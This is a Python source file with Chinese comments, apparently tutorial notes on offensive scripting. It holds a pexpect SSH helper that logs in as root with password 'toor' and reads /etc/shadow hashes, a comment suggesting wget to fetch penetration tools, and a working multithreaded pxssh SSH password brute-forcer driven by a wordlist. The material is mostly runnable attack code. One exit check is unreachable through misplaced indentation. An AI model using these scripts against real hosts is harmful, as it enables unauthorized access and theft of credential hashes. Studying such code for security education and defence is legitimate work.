"""
检查 connect()函数，这个函数接收用户名，主机名和密码，并返回一个
SSH 连接，从而得到大量的 SSH 连接。利用 Pexpect 模块，并等待一个预期
的输出。有三个预期的输出会出现---一个超时，一个信息提示这个主机有一个
新的公共密钥，或者是一个密码输入提示。如果结果是超时，
session.expect()函数将会返回 0，接下来的选择语句警告这个并在返回之前打
印一个错误信息。如果 child.expect()函数捕捉到一个 ssh_newkey 信息，他
将返回 1.这将迫使函数发送一个消息“yes”来接受这个新 key。接下来，函数
在发送密码之前将等待密码提示。
"""
__author__ = 'dj'
import pexpect
PROMPT = ['# ', '>>> ', '> ', '\$ ']
def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)
def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)  # pexpect.spawn 要在Linux下运行
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword:'])
    if ret == 0:
        print('[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
    if ret == 0:
        print('[-] Error Connecting')
        return
    child.sendline(password)
    child.expect(PROMPT)
    return child
"""一旦通过认证，现在我们可以使用一个单独的函数 commend()发送命令给
SSH 会话。commend()函数接受一个 SSH 会话和命令字符串作为输入。然后
发送命令字符串给 SSH 会话，等待命令提示。捕捉到命令提示后将从 SSH 会
话中打印输出。"""
def main():
    host = 'localhost'
    user = 'root'
    password = 'toor'
    child = connect(user, host, password)
    send_command(child, 'cat /etc/shadow | grep root')
if __name__=='__main__':
    main()

"""运行这个脚本。我们可以看到我们可以连接到一个 SSH 服务器，并远程控制者
个主机。我们通过简单的命令以 root 身份读取/etc/shadow 文件来显示哈希
密码，我么可以使用这个工具做一些更狡猾的事情，比如说用 wget 下载渗透
工具。你可以在 Backtrack 上通过生成 ssh-keys 来启动 SSH 服务。尝试启动
SSH 服务器，然后用这个脚本区连接它"""


#通过 Pxssh 暴力破解 SSH 密码  Pxssh 是 Pexpect 模块附带的脚本
# coding=UTF-8
from pexpect import pxssh
import optparse
import time
import threading
maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def connect(host, user, password, release):
 global Found, Fails
 try:
    s = pxssh.pxssh()
    s.login(host, user, password)
    print('[+] Password Found: ' + password)
    Found = True
 except Exception as e:
    if 'read_nonblocking' in str(e):
        Fails += 1
        time.sleep(5)
        connect(host, user, password, False)
    elif 'synchronize with original prompt' in str(e):
        time.sleep(1)
        connect(host, user, password, False)
 finally:
    if release:
        connection_lock.release()

def main():
     parser = optparse.OptionParser('usage%prog ' + '-H < target host > -u < user > -f < password list > ')
     parser.add_option('-H', dest='tgtHost', type='string',
                       help='specify target host')
     parser.add_option('-f', dest='passwdFile', type='string',
                       help='specify password file')
     parser.add_option('-u', dest='user', type='string',
                       help='specify the user')
     (options, args) = parser.parse_args()
     host = options.tgtHost
     passwdFile = options.passwdFile
     user = options.user
     if host == None or passwdFile == None or user == None:
         print(parser.usage)
         exit(0)
     fn = open(passwdFile, 'r')
     for line in fn.readlines():
         if Found:
            print("[*] Exiting: Password Found")
            exit(0)
            if Fails > 5:
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(0)
         connection_lock.acquire()
         password = line.strip('\r').strip('\n')
         print("[-] Testing: " + str(password))
         t = threading.Thread(target=connect, args=(host,
                                                user, password, True))
         t.start()
if __name__ == '__main__':
    main()